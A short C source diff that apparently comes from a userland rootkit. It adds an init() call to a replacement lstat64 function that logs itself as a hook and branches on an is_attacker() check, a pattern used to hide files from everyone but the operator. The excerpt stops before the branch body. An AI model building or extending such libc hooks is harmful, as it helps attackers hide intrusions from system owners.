@@ -26,6 +26,7 @@
 #include "hooks.h" /* prototype */
 
 int lstat64(const char *path, struct stat64 *buf) {
+    init();
     DEBUG(D_INFO, "called lstat(3) hook");
 
     if (is_attacker())
